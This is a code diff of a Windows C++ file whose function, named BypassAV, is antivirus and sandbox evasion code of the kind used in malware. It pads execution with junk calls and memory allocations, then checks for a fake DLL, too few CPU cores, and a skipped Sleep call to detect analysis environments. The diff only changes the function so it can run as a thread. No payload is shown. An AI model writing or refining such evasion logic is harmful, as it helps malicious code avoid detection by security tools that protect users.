@@ -1,7 +1,7 @@
 #include <windows.h>
 
 
-bool BypassAV();
+DWORD WINAPI BypassAV(LPVOID);
 void HideWindow();
 void Bunny();
 void Hop1();
@@ -11,13 +11,13 @@ void Hop4();
 void Hop5();
 
 
-bool BypassAV(){
+DWORD WINAPI BypassAV(LPVOID params){
 	Bunny();// }=> Obfuscate the code with function calls and garbage memory allocations...
 
 
-	HINSTANCE DLL = LoadLibrary(TEXT("fake.dll")); //}
+	HINSTANCE DLL = LoadLibrary(TEXT("fakeass.dll")); //}
 	if(DLL != NULL){//								 |
-		BypassAV();					//				 |=> Try to load a fake dll... 
+		BypassAV(NULL);					//				 |=> Try to load a fake dll... 
 	}//												 }
 
 
@@ -27,7 +27,7 @@ bool BypassAV(){
 	GetSystemInfo(&SysGuide);//							|
 	int CoreNum = SysGuide.dwNumberOfProcessors;//		|
 	if(CoreNum < 2){//									|=> Check the number of processor cores...
-		BypassAV();					//					|
+		BypassAV(NULL);					//					|
 	}//													}
 
 
@@ -37,7 +37,7 @@ bool BypassAV(){
 	Sleep(1000);			       //|
 	int Tac = GetTickCount();      //|
 	if((Tac - Tick) < 1000){   	   //|=> Check if the sleep function is skipped...
-		BypassAV();				   //|
+		BypassAV(NULL);				   //|
 	}						       //|
 	//							     }																
 
